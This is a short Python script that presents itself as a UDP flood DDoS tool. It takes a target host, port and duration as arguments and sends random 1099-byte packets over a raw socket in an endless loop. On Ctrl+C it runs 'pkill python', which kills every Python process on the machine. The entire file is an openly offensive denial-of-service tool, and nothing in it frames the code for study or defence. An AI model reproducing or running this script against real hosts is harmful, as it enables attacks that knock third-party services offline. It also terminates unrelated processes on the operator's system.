
import os
import random
import sys
import socket, time, secrets
import ipaddress

os.system('clear' if os.name == 'posix' else 'cls')          

def main():
    print("UDP-VIP PowerFull DDOS BY IZero")

    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    times = int(sys.argv[3])
    target = socket.gethostbyname(ip)

    while True:
        try:
            data = os.urandom(1099)
            start_time = time.time()
            print("\033[1m[Broadcast] Successfuly Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

            addr = (str(target), int(port))
        
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.setsockopt(socket.SOL_IP, socket.SO_BROADCAST, 1)
            s.setblocking(False)
            while time.time() - start_time < times:
                try:
                    s.sendto(data,addr)
                except Exception as e:
                    pass
            time.sleep(5)
            s.close()
            os.system('sudo python3 cooldown.py')
                            

        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m ""\033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
            os.system("pkill python")
            sys.exit(0)

        except Exception as e:
            pass


if __name__ == "__main__":
    main()
